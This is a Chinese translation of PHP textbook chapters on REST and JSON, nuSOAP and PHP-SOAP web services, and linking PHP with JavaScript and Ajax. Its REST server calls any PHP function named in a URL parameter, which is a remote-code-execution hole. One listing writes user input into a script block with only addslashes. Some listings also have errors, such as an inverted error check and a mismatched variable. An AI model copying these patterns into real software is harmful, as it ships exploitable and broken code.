  if (isset($_GET['method']) && isset($_GET['parameter'])) {
  ```
  
  此时可以进行进一步检查。但是，对于这个简单示例，我们只需确定参数是否存在即可。
- 2. 然后处理 URL 参数。包含函数参数的第二个 URL 参数使用 `json_decode()` 从 JSON 格式转换为 PHP 数组：
  
  ```
  $method = $_GET['method'];
  $parameter = json_decode($_GET['parameter']);
  ```
- 3. 为了防止调用未知方法，我们检查被调用的函数是否存在：
  
  ```
  if (function_exists($method)) {
  ```
  
  在实际应用场景中，将所有可调用函数注册到数组或对象中，并仅允许注册的函数是有意义的。
- 4. 然后可以通过使用第一个参数调用方法来获取结果。结果本身在同一步骤中也被转换回数组，然后使用 `json_encode()` 转换为序列化数组：
  
  ```
  $result = [method($parameter[0])];
  echo json_encode($result);
  ```

当使用具有不同数量参数的多个方法时，必须在此处添加进一步检查。

清单 27.1 包含完整代码；图 27.3 显示输出。

```
<?php
function square($a) {
    if ($a != null && trim($a) != "") {
        $square = $a * $a;
        return $square;
    }
}

if (isset($_GET['method']) && isset($_GET['parameter'])) {
    $method = $_GET['method'];
    $parameter = json_decode($_GET['parameter']);
    if (function_exists($method)) {
        $result = [$method($parameter[0])];
        echo json_encode($result);
    }
}
?>
```

### 清单 27.1 REST 服务器 ("rest_server.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_753_0.png)

### 图 27.3 直接使用 "GET" 参数调用时服务器的返回

客户端的结构非常简单。如果在 `php.ini` 中激活了 `allow_url_fopen`，则可以使用文件函数直接访问 REST 服务。这里我们使用 `file_get_contents()`。核心是此处组装的 URL：

```
$url = 'http://localhost/php/rest_server.php?method=' .
    urlencode($method) . '&parameter=' . urlencode(json_encode($parameter));
```





响应本身仍需检查。`file_get_contents()` 在调用失败时返回 `false`。随后必须使用 `json_decode()` 转换响应，在本例中，数组的第一个元素即为响应。下面的清单展示了完整脚本；输出如图 27.4 所示。

```php
<?php
$method = 'square';
$a = 24;
$parameter = [$a];
$url = 'http://localhost/php/rest_server.php?method=' .
urlencode($method) . '&parameter=' . urlencode(json_encode($parameter));
$answer = file_get_contents($url);
if ($answer == false) {
$result = json_decode($answer)[0];
print "The square of $a is: ". $result;
}
?>
```

## 清单 27.2 REST 客户端 ("rest_client.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_754_0.png)

## 图 27.4 平方也可使用 REST 计算

解码 JSON 时，过去您始终需要依赖有效 JSON 或自行编写验证函数。在 PHP 8.3 中，一项新的验证函数成为 PHP 核心的一部分：`json_validate(JSON string, depth, flag)`。它包含三个参数：

- JSON 字符串是该方法的唯一必填参数，包含待验证的字符串。PHP 在此处将 UTF-8 用作字符串字符编码。
- Depth 是可选规范，表示执行验证的嵌套深度。
- 对于 flags，目前只有一个选项，即 `JSON_INVALID_UTF8_IGNORE`，用于忽略无效的 UTF-8 字符。

下面的清单展示了一个简单示例。

```php
<?php
$json = '{
"shares" : {
"Members" : 120,
"Rheinwerk" : 504
}
}'; 
var_dump(json_validate($json));
?>
```

## 清单 27.3 JSON ("json_validate.php")

在此例中，结果为 true，因为 JSON 有效。通过像下一个清单中那样进行微小更改，可以快速改变这一点。差异难以察觉；仅在 "Members" 条目后缺少一个逗号。

```php
$json = '{
    "shares" : {
        "Members" : 120
        "Rheinwerk" : 504
    }
}'; 
json_validate($json);
echo json_last_error() . " " . json_last_error_msg();
```

## 清单 27.4 JSON ("json_validate_error.php")

json_validate() 本身不返回任何错误消息。PHP 提供另外两个方法用于此目的：json_last_error() 和 json_last_error_msg()。在此示例中，json_last_error() 返回状态代码 4，而 json_last_error_msg() 返回 "Syntax error" 消息。有关 JSON 错误代码，请参见表 27.1。

| 常量 | 代码 | 说明 |
|---|---|---|
| JSON_ERROR_NONE | 0 | 没有错误。 |
| JSON_ERROR_DEPTH | 1 | JSON 超过了最大深度。 |
| JSON_ERROR_STATE_MISMATCH | 2 | 不是正确的 JSON。 |
| JSON_ERROR_CTRL_CHAR | 3 | CTRL 字符错误。 |
| JSON_ERROR_SYNTAX | 4 | 语法错误——最常见的错误类型。 |
| JSON_ERROR_UTF8 | 5 | 验证 UTF-8 字符时出错。 |
| JSON_ERROR_RECURSION | 6 | JSON 中的递归引用。 |
| JSON_ERROR_INF_OR_NAN | 7 | JSON 包含不是数字或无限的值。 |
| JSON_ERROR_UNSUPPORTED_TYPE | 8 | 值包含不支持的数据类型。 |
| JSON_ERROR_INVALID_PROPERTY_NAME | 9 | 验证属性时出错。 |
| JSON_ERROR_UTF16 | 10 | 不是正确的 UTF-16 字符。 |

表 27.1 JSON 错误代码

## 27.3 nuSOAP

nuSOAP 最令人印象深刻的在于其易用性。您会发现，可以非常快速地搭建自己的服务器。

### 27.3.1 服务器

首先，您需要一个服务器，以便测试提供方（服务器）和消费方（客户端）之间的通信。让我们分析一下代码：

- 1. 首先，您需要相应的 nuSOAP PHP 文件。它包含服务器和客户端的功能，下载并解压 ZIP 后可在 *lib* 目录中找到：

```
require_once "lib/nusoap.php";
```

- 2. 然后创建一个新的服务器对象。在此使用 register() 注册您想要使用的函数：

```
$server = new nusoap_server();
$server->register("square");
```

> **提示**
>
> 您也可以将多个函数分配给 SOAP 服务器。但请注意：如果您希望实现完全互操作性，应将自己限制为一个函数，因为某些 SOAP 实现仅能理解一个函数！Flash Web 服务扩展就是一个示例，几乎无法让它调用多个方法。

- 3. 实际的 square() 函数非常简单。它接收一个参数。然后检查是否传递了该参数且包含值。如果是，则返回平方。否则，服务器会返回 SOAP 错误，如清单 27.5 所示。

```php
function square($a) {
if ($a != null && trim($a) != "") {
    $square = $a * $a;
    return $square;
} else {
    return new soap_fault("Client", "", "No parameter");
}
}
```

- 4. 现在服务器仍需响应调用。为此，它需要调用的 POST 数据。我们使用新的 php://input 功能而非 $HTTP_RAW_POST_DATA 来读取数据。此处的检查有助于避免在直接调用时生成错误消息。使用 service(data) 方法执行服务器：

```
$data = file_get_contents("php://input") ?? "";
$server->service($data);
```

就这么多。下面的清单展示了完整代码。

```php
<?php
function square($a) {
if ($a != null && trim($a) != "") {
    $square = $a * $a;
    return $square;
} else {
    return new soap_fault("Client", "", "No parameter");
}
}

require_once "lib/nusoap.php";
$server = new nusoap_server();

$server->register("square");
$data = file_get_contents("php://input") ?? "";
$server->service($data);

?>
```

## 清单 27.5 一个 nuSOAP 服务器 ("nusoap-server.php")

**注意**

在此示例中，nuSOAP 会自动确定数据类型。不过，您也可以选择手动选取数据类型。为此，请使用 soapval(name, type, value, namespace_value, namespace_type, attributes) 函数。对于名称，也可以输入空字符串。类型即为数据类型；值为实际传输内容。如果您想创建自己的变量和数据类型并告知通信伙伴它们是什么，则应使用命名空间。

### 27.3.2 客户端

接下来我们来看要使用该服务的客户端。它再次像往常一样开始：

- 1. 首先添加 nuSOAP 库：

```
require_once "nusoap.php";
```

- 2. 接下来是客户端调用。您将服务的 URL 作为参数输入：

```
$client = new nusoap_client("http://localhost/php/nusoap_server.php");
```

> 注意
>
> nuSOAP 还提供另外两个方法，即 soap_server() 和 soapclient()，分别用于服务器和客户端。

- 3. 实际方法调用使用 call(method, parameter) 执行。参数作为数组传递：

```
$a = 36;
$answer = $client->call("square", [$a]);
```

- 4. 最后，检查是否发生任何错误。如果一切正常，则显示结果：

```
if ($error = $client->getError()) {
 print "Error: " . $error;
} elseif ($error = $client->fault) {
 print "SOAP error: " . $error;
} else {
   print "The square of $a is " . $answer;
}
```

清单 27.6 展示了完整脚本；输出如图 27.5 所示。

```php
<?php
require_once "lib/nusoap.php";

$a = 36;

$client = new nusoap_client("http://localhost/php/nusoap_server.php");
$response = $client->call("square", [$a]);

if ($error = $client->getError()) {
 print "Error: " . $error;
} elseif ($error = $client->fault) {
 print "SOAP error: " . $error;
} else {
   print "The square of $a is " . $answer;
}
?>
```

## 清单 27.6 带有 nuSOAP 的客户端 ("nusoap_client.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_759_0.png)

## 图 27.5 您已经算好了吗？

### 27.3.3 WSDL

到目前为止，nuSOAP 示例根本不需要 WSDL。但 WSDL 是一个重要元素，尤其是与其他技术实现互操作时。要创建 WSDL，您只需对脚本做一点调整：

- 1. 首先配置 WSDL。为此，为服务指定一个名称（此处为 Square）和一个命名空间：

```
$server->configureWSDL("Square", "http://www.arrabiata.de/nusoap/");
```

- 2. 接下来注册方法。此处函数名称、格式、当前时间和架构命名空间很重要：

```
$server->register("square",
  ["a" => "xsd:int"],
  ["square" => "xsd:int"],
  "http://soapinterop.org/"
);
```

清单 27.7 包含完整代码。

```php
<?php
function square($a) {
  if ($a != null && trim($a) != "") {
    $square = $a * $a;
    return $square;
  } else {
    return new soap_fault("Client", "", "No parameter");
  }
}
```





```php
require_once "lib/nusoap.php";
$server = new nusoap_server();

$server->configureWSDL("Square", "http://www.arrabiata.de/nusoap/");

$server->register("square",
    ["a" => "xsd:int"],
    ["square" => "xsd:int"],
    "http://soapinterop.org/"
);

$data = file_get_contents("php://input") != null ?
    file_get_contents("php://input") : "";
$server->service($data);
exit();
?>
```

### 清单 27.7 带 nuSOAP 的 WSDL ("nusoap_wsdl_server.php")

你可以轻松查看 nuSOAP 生成的 WSDL。只需在脚本名称后附加 ?wsdl。在我们的示例中，本地地址是 http://localhost/php/nusoap_wsdl_service.php?wsdl（参见图 27.7）。WSDL 的长度表明自动生成当然有其优势。

![](img/ae7820c36e8f24c1623d26668b28e80e_760_0.png)

### 图 27.6 方法描述

> 提示
> 如果在不带 ?wsdl 的情况下调用服务，您将收到一个引用 WSDL 并提供方法描述的信息页面（参见图 27.6）。nuSOAP 已采用了这种有用的行为，以及来自 Microsoft ASP.NET Web 服务的 ?wsdl。

![](img/ae7820c36e8f24c1623d26668b28e80e_761_0.png)

### 图 27.7 服务器的 WSDL

现在，让我们继续介绍 WSDL 调用的客户端：

- 调用客户端时，将 WSDL 作为 URL 输入。您还必须在选项数组中将第二个参数指定为要使用的 WSDL：

```php
$client = new nusoap_client("http://localhost/php/nusoap_wsdl_server.php?wsdl", true);
```

- 然后使用 call() 调用方法：

```php
$a = 48;
$result = $client->call('square', [ 'a' => $a],
                                 'http://www.arrabiata.de/nusoap/');
```

或者，您也可以使用代理调用方法：

```php
$proxy = $client->getProxy();
$result = $proxy->square($a);
```

- 最后，执行错误检查和输出：

```php
if ($error = $client->getError()) {
    print "Error: " . $error;
} elseif ($error = $client->fault) {
    print "SOAP error: " . $error;
} else {
    print "The square of $a is " . $result;
}
```

清单 27.8 显示了完整代码。与普通客户端相比，最重要的更改已以粗体突出显示。图 27.8 显示了输出。

```php
<?php
require_once "lib/nusoap.php";
$client = new nusoap_client(
"http://localhost/php/nusoap_wsdl_server.php?wsdl",
true);
$a = 48;
$result = $client->call('square', ['a' => $a],
'http://www.arrabiata.de/nusoap/');
if ($error = $client->getError()) {
    print "Error: " . $error;
} elseif ($error = $client->fault) {
    print "SOAP error: " . $error;
} else {
    print "The square of $a is " . $result;
}
?>
```

### 清单 27.8 WSDL 客户端 ("nusoap_wsdl_client.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_762_0.png)

### 图 27.8 现在心算变得更加困难了…

> 提示
> 要测试错误处理，只需不传递任何参数。您可以在图 27.9 中看到结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_763_0.png)

### 图 27.9 错误消息指示未传递任何参数。

### 27.3.4 结论

nuSOAP 最令人印象深刻的是其易用性。使用 nuSOAP，您只需复制一个文件。它使用非常灵活，且不需要已安装的 SOAP 库。

## 27.4 PHP-SOAP

PHP-SOAP 是 PHP 中的标准 Web 服务库。起初对此曾有过一些讨论：是否真的需要一个新库，或者将现有库移植到 C 语言是否更好？基于 C 的 PHP 扩展的主要原因是性能。最终选择新开发，以便能够在绿地项目上从头构建，而不必拖着任何旧代码。此外，可以选择 libxml 作为基础，这进一步标准化了 PHP 中的 XML 支持。

### 27.4.1 服务器

服务器创建起来很快：

- SoapServer 对象包含所有重要内容。第一个参数用于 WSDL。由于我们在此处不使用 WSDL，而是使用普通 SOAP 调用，因此传递 null。第二个参数是带有选项的关联数组：

```php
$server = new SoapServer(null, ["uri" =>
"http://www.arrabiata.de/PHP-SOAP/" ]);
```

- 再次使用 square() 函数。与之前相比，只有错误抛出发生了变化：

```php
throw new SoapFault("Client", "No parameter");
```

- 最后，将函数添加到服务器并使用 handle() 启动服务器：

```php
$server->addFunction("square");
$server->handle();
```

清单 27.9 显示了完整脚本。

```php
<?php
$server = new SoapServer(null, ["uri" =>
"http://www.arrabiata.de/PHP-SOAP/" ]);

function square($a) {
    if ($a != null && trim($a) != "") {
        $square = $a * $a;
        return $square;
    } else {
        throw new SoapFault("Client", "No parameter");
    }
}

$server->addFunction("square");
$server->handle();
?>
```

### 清单 27.9 PHP SOAP 服务器 ("php_soap_server.php")

> 提示
> 您可以使用类而不是函数，并使用 setClass(class) 将其设置。此变体可在本书材料中找到（参见前言），文件名为 php_soap_server_class.php。

### 27.4.2 客户端

使用客户端时，PHP-SOAP 的简单处理更加明显：

- 您使用 SoapClient 对象创建客户端。此处的第一个参数同样用于 WSDL。如果没有可用的 WSDL（如本示例），则写入 0。第二个参数是带有选项的关联数组。当然，`location` 选项（指定 SOAP Web 服务的位置）尤为重要：

```php
$client = new SoapClient(null, ['location' =>
"http://localhost/php/php_soap_server.php",
'uri' => "http://arrabiata.de/PHP-SOAP/" ]);
```

- PHP-SOAP 中的错误处理使用 try ... catch：

```php
try {
  ... Further processing
} catch (SoapFault $ex) {
  ... Error handling
}
```

- 您在 try 块中调用方法。这是通过 __soapCall(method, parameter) 完成的。参数作为数组指定：

```php
$a = 111;
$answer = $client->__soapCall("square", [$a]);
print "The square of $a is: " . $answer;
```

- 最后，您需要错误处理的代码。这里我们直接从 SoapFault 对象中读取错误代码和相关描述。图 27.10 显示了输出：

```php
print "Error code: " . $ex->faultcode . "<br/>";
print "Error string: " . $ex->faultstring;
```

![](img/ae7820c36e8f24c1623d26668b28e80e_765_0.png)

### 图 27.10 缺少参数时的错误消息

以下清单显示了客户端的完整代码；图 27.11 显示了输出。

```php
<?php
$client = new SoapClient(null, ['location' =>
   "http://localhost/php/php_soap_server.php",
   'uri' => "http://arrabiata.de/PHP-SOAP/" ]);
try {
  $a = 111;
  $answer = $client->__soapCall("square", [$a]);
  print "The square of $a is: " . $answer;
} catch (SoapFault $ex) {
  print "Error code: " . $ex->faultcode . "<br/>";
  print "Error string: " . $ex->faultstring;
}
?>
```

### 清单 27.10 PHP SOAP 客户端 ("php_soap_client.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_766_0.png)

### 图 27.11 由 PHP-SOAP 解决的勤奋任务

### 27.4.3 WSDL

使用 PHP-SOAP 可以轻松使用 WSDL。您只需将相应 WSDL 的地址插入到 SoapClient(WSDL, options) 对象和 SoapServer(WSDL, options) 对象中。唯一的问题是，您需要现成的 WSDL。与 nuSOAP 和 PEAR::SOAP 不同，PHP-SOAP 不支持 WSDL 生成。这意味着您必须手动编写 WSDL 或以其他方式生成它。

> 注意
>
> 这是 PHP-SOAP 开发期间一个争论激烈的话题。反对 WSDL 支持的论点是，生成会消耗性能，并且原则上这不是 SOAP/Web 服务库的任务。

首先来看服务器代码。最重要的新功能是 WSDL 文档。

```php
<?php
$server = new SoapServer("http://localhost/php/square.wsdl",
["uri" => "http://www.arrabiata.de/PHP-SOAP/"]);

class Methods {
function square($a) {
if ($a != null && trim($a) != "") {
$square = $a * $a;
return $square;
} else {
throw new SoapFault("Client", "No parameter");
}
}
}
$server->setClass("Methods");
$server->handle();
?>
```

### 清单 27.11 带 WSDL 的 PHP SOAP 服务器 ("php_soap_wsdl_server.php")





客户端也没有多大变化。你插入 WSDL（或者：Web 服务的 URL 并附加 ?wsdl），然后直接调用方法。错误处理保持不变。

```php
$client = new SoapClient("http://localhost/php/square.wsdl",
  ['location' => "http://localhost/php/php-soap-server.php",
   'uri' => "http://arrabiata.de/PHP-SOAP/"]);
try {
  $a = 112;
  $answer = $client->square($a);
  print "The square of $a is: ". $answer;
} catch (SoapFault $ex) {
  print "Error code: ". $ex->faultcode . "<br/>";
  print "Error string: ". $ex->faultstring;
}
?>
```

清单 27.12 带 WSDL 的 PHP SOAP 客户端 ("php_soap_wsdl_client.php")

### 27.4.4 结论

决定不在 SOAP 扩展中包含 WSDL 支持，这一点完全可以理解，但我们仍然觉得这不切实际。手动生成 WSDL 文档非常耗时。除此之外，PHP-SOAP 运行良好，而且它是标准库。

# 第 28 章
JavaScript

近年来，JavaScript 经历了令人惊讶的复兴，而且这不仅归功于 Ajax。与 PHP 结合使用，它开启了令人兴奋的应用可能性。

简要回顾一下：20 世纪 90 年代中期，网站开始变得流行。然而，服务器端技术当时几乎没有普及，而且往往价格不菲。只有 Perl 也被低价主机提供，但也存在一些潜在缺点：如果你曾对看到 HTTP 错误 500 消息感到厌倦，那你就明白我们的意思。

当时，JavaScript 实现了一定形式的动态性。JavaScript 是一种编程语言，由当时的浏览器市场领导者 Netscape 发明。该语言最初名为 LiveScript，但后来改名为 JavaScript。这纯粹是 Java 开发商 Sun Microsystems 与 Netscape 之间的一项营销协议，因为这两种语言之间的关系大致就像 PHP 与 Perl 之间一样——也就是说，几乎没有关系。

随着 PHP 或 ASP.NET（现在是 ASP.NET Core）等更方便的服务器端技术越来越普及，JavaScript 最初落后于人：既然可以在服务器端完成，为什么还要使用用户可以在浏览器中禁用的客户端脚本呢？然而，与此同时，一种合理的观点正在获得认同，即仅出于性能原因，补充服务器端脚本的 JavaScript 解决方案也有存在的权利。客户端和服务器端脚本经常“携手合作”：一个 PHP 脚本从数据库中提供信息，然后通过 JavaScript 效果将其集成到 HTML 页面中。

2005 年初，一个新的流行语席卷了 IT 界，帮助 JavaScript 意外地复兴：Ajax。这是一个人造词，最初代表“异步 JavaScript 和 XML”。Ajax 其实是老酒新瓶——但它也提供了大量其他可能的应用。

## 28.1 准备工作

没有专门用于 JavaScript 的 PHP 扩展。为什么应该有一个呢？在本章中，你将找到一般信息和技巧，了解如何使用 PHP 服务器端技术创建客户端脚本，以及如何让这两种技术携手合作。这样做不需要重新配置 PHP。

然而，了解客户端和服务器端（即 JavaScript 与 PHP）之间的交互必须如何工作非常重要。PHP 代码在 Web 服务器上执行，在那里生成 HTML 代码（或其他格式），然后发送到客户端。随后，任何 JavaScript 代码都在客户端执行。因此，你可以使用 PHP 创建随后在浏览器中本地执行的代码。

这里顺序很重要：

- 1. PHP 脚本被调用并执行。
- 2. PHP 脚本的结果（例如，HTML）被发送到浏览器。
- 3. 浏览器可能会执行 JavaScript 代码。

这意味着 PHP 先执行，随后——完全独立于此——执行 JavaScript 代码。因此，你无法从 JavaScript 直接访问 PHP 代码（例如 PHP 变量）。当 JavaScript 执行时，PHP 已经完成了它的工作。JavaScript 解释器不知道 PHP 参与其中。因此，所有应提供给 JavaScript 代码的信息必须包含在 HTML/JavaScript 代码中。但是，如何才能从 JavaScript 访问 PHP 变量呢？你可以使用 PHP 创建 JavaScript 代码，并在其中嵌入 PHP 变量。你可以在本章中了解如何做到这一点。

## 28.2 将 JavaScript 与 PHP 连接

两种技术之间的交互有两个方向：一方面，在 JavaScript 代码中获取 PHP 变量（或信息）可能很有用；另一方面，PHP 这一方也关心 JavaScript 确定了什么。

为了清晰起见，前面始终使用简单的示例——例如 window.alert()。最终目标是传达 PHP 与 JavaScript 协同工作的技术。

### 28.2.1 使用 JavaScript 读取 PHP 变量

为了让 JavaScript 访问 PHP 变量，PHP 必须创建一个 JavaScript 变量，并为其赋予 PHP 变量的值。让我们一步步来，首先从 PHP 创建 JavaScript 变量开始：

```php
<?php
echo "<script>\n";
echo "var phpVersion = \"8.3.12\";\n";
echo "</script> ";
?>
```

这段代码向客户端发送以下 HTML/JavaScript：

```html
<script>
var phpVersion = "8.3.12";
</script>
```

使用 PHP 变量时，代码看起来非常相似：

```php
<?php
$phpv = phpversion();
echo "<script>\n";
echo "var phpVersion = \"$phpv\";\n";
echo "</script> ";
?>
```

当然，函数调用也可以直接放在代码中：

```php
<?php
echo "<script>\n";
echo "var phpVersion = \"" . phpversion() . "\";\n";
echo "</script> ";
?>
```

下面的清单显示了一个完整的脚本，它在警告窗口中显示当前的 PHP 版本（参见图 28.1）。

```html
<html>
<head>
<title>PHP and JavaScript</title>
<script>
<?php
echo " var phpVersion = \"" . phpversion() . "\";\n";
echo " window.alert(\"Generated by PHP \" + phpVersion);";
?>
</script>
</head>
<body>
<?php
?>If nothing happens, you have deactivated JavaScript!</p>
</body>
</html>
```

清单 28.1 通过 JavaScript 输出 PHP 版本 ("js-1.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_772_0.png)

### 图 28.1 JavaScript 显示 PHP 版本

但是，如果要输出的变量值包含会使生成的 JavaScript 代码无效的特殊字符，情况就会稍微复杂一些。以下字符尤其“危险”：

- **引号**
  可以使用 addslashes() 方便地处理。

- **所有有转义序列的字符**
  这些包括 \r、\n、\t 等等。字符串内的换行不应作为换行输出，而应作为 \n。因此，这些特殊字符必须特殊处理：

```php
$replacement = [
    "\n" => "\\\n",
    "\r" => "\\\r",
    "\t" => "\\\t"
];
$variable = addslashes($variable);
$variable = strtr($variable, $replacement);
```

最后，变量作为 JavaScript 代码输出：

```php
<?php
echo("<script>\n");
echo("var phpVariable = \"$variable\";\n");
echo("</script>");
?>
```

那么，存储了以下字符串的 $variable PHP 变量会发生什么情况？

> > "永远不会有终结，" 她说。
> > (Jodi Kantor)

经过前面列出的两个步骤后，$variable 具有以下值：

```php
$variable = "\\\\\"There isn\\'t ever going to be an end\\\\\", she said.\n
(Jodi Kantor)";
```

生成了以下 JavaScript 代码：

```javascript
var javascriptVariable = "\"There isn\'t ever going to be an end\", she said.
\n(Jodi Kantor)";
```

这里有一个小示例：可以在多行文本框中输入任何文本。表单发送后，PHP 代码生成 JavaScript 代码，在文本框中输出文本。如清单 28.2 所示，这与输入和代码中的换行符完美配合。

```php
<html>
<head>
<title>PHP und JavaScript</title>

<?php
$variable1 = "";
if (isset($_POST["text"]) && !empty($_POST["text"]) &&
is_string($_POST["text"])) {
    $variable1 = addslashes($_POST["text"]);
    $replacements = [
        "\n" => "\\n",
        "\r" => "\\r",
        "\t" => "\\t"
    ];
    $variable2 = strtr($variable1, $replacements);
    echo("<script>\n");
    echo("var phpVariable = \"$variable2\";\n");
    echo("window.alert(phpVariable);\n");
    echo("</script> ");
}
?>

</head>
<body>
<form method="post" action="">
<b>Text:</b>
<textarea name="text" rows="10" cols="70"><?php
echo(htmlspecialchars(stripslashes($variable1)));
?></textarea>
<br />
<input type="submit" value="Send data" />
</form>
</body>
</html>
```

清单 28.2 特殊字符编码正确 ("js-2.php")





![](img/ae7820c36e8f24c1623d26668b28e80e_774_0.png)

图 28.2 输入即输出正确

### 28.2.2 用 PHP 读取 JavaScript 变量

反过来，从 PHP 访问 JavaScript 变量就不那么容易了。原因很简单：当 JavaScript 代码执行时，PHP 已经完成了它的任务。因此，关于这种访问是否可能，第一个普遍的答案就是否定的。

不过，仔细来看，有方法可以实现这种访问。虽然生成 JavaScript 代码的 PHP 脚本无法访问其中的变量，但下一个 PHP 脚本可以做到。这里需要做的只是将 JavaScript 数据传递给 PHP 脚本。当然，如果将信息附加到脚本的 URL 上，这就特别容易了：

```
<script>
var jsVariable = "dynamically generated fill data";
location.href = "script.php?jsVar=" + encodeURIComponent(jsVariable);
</script>
```

> **注意**
> 
> encodeURIComponent() JavaScript 函数将字符串中的特殊字符转换为符合 URL 参数要求的格式；例如，动态生成的填充数据会变成字符串 dynamically%20generated%20fill%20data。这个重要步骤常常被遗忘。更糟糕的是，使用旧版浏览器的人有时甚至不会注意到错误，因为有些浏览器允许 URL 中包含特殊字符（例如，空格），或者不会对此发出警告。

在浏览器中设置 location.href 会加载新页面，这并非总是理想的做法。但有办法可以绕过这个问题：

- 使用隐藏 iframe：
  top.frames["iframe name"].src =
  "script.php?jsVar=" + encodeURIComponent(jsVariable);

- 加载（可能不可见的）图形：
  document.images["image name"].src =
  "script.php?jsVar=" + encodeURIComponent(jsVariable);

## 28.3 Ajax

JavaScript 可访问的 XMLHttpRequest 对象自 1998 年左右起就在 Microsoft Internet Explorer 中可用。这使得可以在后台使用 JavaScript 发送 HTTP 请求并评估其返回值。该对象最初由 Microsoft 发明，纯粹是为了自身利益，因为要为内部 Outlook 邮件系统创建一个 Web 版本。为了避免页面不断（可见地）重新加载，诸如 XMLHttpRequest 之类的技术变得必要。

时间快进到新世纪初：人们逐渐意识到 Microsoft 的浏览器技术其实是件好事。相关 Web 浏览器逐渐添加了对其的支持：在 Mozilla 及因此的 Firefox 和同类浏览器中，在 Opera 浏览器中，以及在 Safari 中也是如此。尽管版本号很高，Google Chrome 作为最新的主流浏览器也支持此功能的 JavaScript，Edge（以及当前的 Opera 浏览器）也是如此。

目前为止，一切都好——但这项技术在 Web 上仍未得到显著普及。然而，Google 发布了一些严重依赖 XMLHttpRequest 的网站。顾问 Jesse James Garrett 抓住这个机会，创造了 Ajax。¹ 这本应代表异步 JavaScript 和 XML，但实际上是个误称；XML 根本不是必需的。无论如何，自该术语被创造以来，Web 世界的一半人都跟上了这项“新”技术的潮流——但所涉及的都是相对琐碎的事情。

当然，下面的说法大大简化了，但 Ajax 可以相对简单地总结为：

- JavaScript 可以向服务器发送 HTTP 请求（无需刷新页面）。
- JavaScript 可以访问这些 HTTP 请求的结果。

得益于 JavaScript 的 DOM 功能，仍然可以巧妙地将服务器的返回集成到页面中。这是这种做法的早期著名示例之一：Google。如果你在那里输入搜索词，Google 会在你输入时搜索相应的搜索查询并提供合适的建议，如图 28.3 所示。

¹ 介绍 Ajax 的论文的存档版本可在 http://s-prs.co/v602240 找到。

![](img/ae7820c36e8f24c1623d26668b28e80e_776_0.png)

图 28.3 Google 尝试完成查询

这里不再赘述实际上为此所需的 JavaScript 代码；那应该是 JavaScript 图书的内容。然而，有一些包能在客户端 JavaScript 和服务器端 PHP 之间建立相对便捷的连接。客户端和服务器之间的“粘合剂”当然是 Ajax——或者说 XMLHttpRequest。

该领域的早期包之一是 Sajax，可在 https://github.com/ajenbo/sajax 获取。不幸的是，感觉已经很久没有更新了，而且从 PHP 角度来看，在错误处理方面不得不做出妥协。但该包仍然非常适合简短的 JavaScript 示例。分发 ZIP 包含 Sajax.php 文件，其中包含编程所需的一切内容。²

² 该文件未包含在书籍代码清单中：你需要从 GitHub 上的 Sajax 项目主页获取它。

然后初始化该包并导出 PHP 函数，使其在客户端可用。最后，sajax_handle_request() 确保当前 PHP 脚本也准备好接受相应的 XMLHttpRequest 请求：

```
sajax_init();
sajax_export("serverTime");
sajax_handle_client_request();
```

Sajax 会为每个导出的服务器端 PHP 函数生成相应的客户端 JavaScript 函数，用于建立连接和交换数据。函数名带有 x_ 前缀。因此，serverTime() PHP 函数会自动生成一个 x_serverTime() JavaScript 函数。这会自动增加一个额外参数：回调函数，它在服务器返回可用时被精确调用；通信是异步的。这样可以定期输出服务器时间（示例中约每秒一次）：

```
function showServerTime() {
x_serverTime(serverTime_callback);
setTimeout(showServerTime, 1000);
}
showServerTime();
```

```
function serverTime_callback(result) {
document.getElementById("Time").innerHTML = result;
}
...
```

```
<p id="Time"></p>
```

只剩一个问题：确保数据交换的所有功能从何而来？Sajax 负责此事，它可以自动生成相应的 JavaScript 代码，前提是你在 <script> 元素中也调用了相应的函数：

```
<script>
<?php
sajax_show_javascript();
?>
</script>
```

清单 28.3 再次展示了完整的脚本。

```php
<?php
function serverTime() {
    return date("H:i:s");
}
require_once "Sajax.php";
sajax_init();
sajax_export("serverTime");
sajax_handle_client_request();
?>
<html>
<head>
<title>PHP and JavaScript</title>
<script>
<?php
sajax_show_javascript();
?>
function showServerTime() {
    x_serverTime(serverTime_callback);
    setTimeout(showServerTime, 1000);
}
showServerTime();
function serverTime_callback(result) {
    document.getElementById("Time").innerHTML = result;
}
</script>
</head>
<body>
<p id="Time"></p>
</body>
</html>
```

## 清单 28.3 时间来自服务器（“ajax.php”）

图 28.4 同时展示了输出以及后台发生的情况：浏览器的 Web 工具显示倒数第二个 HTTP 请求的返回。浏览器视图已经领先一秒。

因此，要对 Ajax 或 XMLHttpRequest 有所作为，需要深入了解 JavaScript。之后，有许多有用的应用可能性——但前提全部是 JavaScript 已被激活。





![](img/ae7820c36e8f24c1623d26668b28e80e_779_0.png)

图 28.4 简单输出，后台有大量技术

## JavaScript 的编码与解码

Ajax 应用程序在客户端和服务器之间传输大量数据时，几乎完全依赖一种特殊格式：JSON（参见 http://json.org）。JSON 基于 JavaScript 语法特性，可非常紧凑地表示数组和对象。简单调用 JSON.parse() JavaScript 函数即可将 JSON 格式的数据转换为 JavaScript 值。返回路径——即将 JavaScript 值转换为 JSON 字符串——由 JSON.stringify() 执行。

使用 PHP，您可以非常轻松地生成和解码 JSON 数据。相应的函数称为 json_encode() 和 json_decode()。请参考以下示例：

```php
<?php
class A {
    public $b;
    function __construct($c) {
        $this->b = $c;
    }
}

$data = [1, "hello", true, new A("xyz")];
echo json_encode($data);
// Output: [1, "hello",true,{"b": "xyz"}]
var_dump(json_decode("[1,\"hello\",true,{\"b\":\"xyz\"}]"));
// Output: array(4) {
// [0]=>
// int(1)
// [1]=>
// string(5) "hello"
// [2]=>
// bool(true)
// [3]=>
// object(stdClass)#2 (1) {
//   ["b"]=>
//   string(3) "xyz"
// }
// }
?>
```

第 27 章也讨论了与 REST API 相关的 JSON。

## 28.4 Web 套接字

Ajax 相当不错，但性能并不特别出色；毕竟，整个东西仍然基于 HTTP。使用 Web 套接字或 Web 套接字协议，存在一种可能的替代方案。这是一种非常高性能的全双工通信协议，能够以非常简单的方式与服务器交换数据。HTTP 仍在使用，但仅用于建立连接。

